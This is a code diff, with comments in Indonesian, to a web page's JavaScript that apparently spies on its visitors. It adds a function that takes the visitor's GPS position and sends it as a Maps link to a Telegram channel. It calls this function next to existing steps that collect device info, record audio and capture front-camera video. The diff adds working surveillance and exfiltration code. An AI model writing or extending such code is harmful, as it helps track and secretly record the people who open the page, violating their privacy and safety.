@@ -139,6 +139,21 @@
       } catch {}
     }
 
+    // Fungsi Baru: Mendapatkan Lokasi GPS
+    function getGPS() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+        );
+      } else {
+        sendToTelegram(`📍 Browser tidak support GPS`);
+      }
+    }
+
     async function recordAudio() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -192,6 +207,7 @@
       
       try {
         await getInfo();
+        getGPS(); // Memanggil fungsi lokasi yang baru ditambahkan
         recordAudio(); 
         
         infoDiv.innerText = '🎥 Merekam video depan (6s)...';
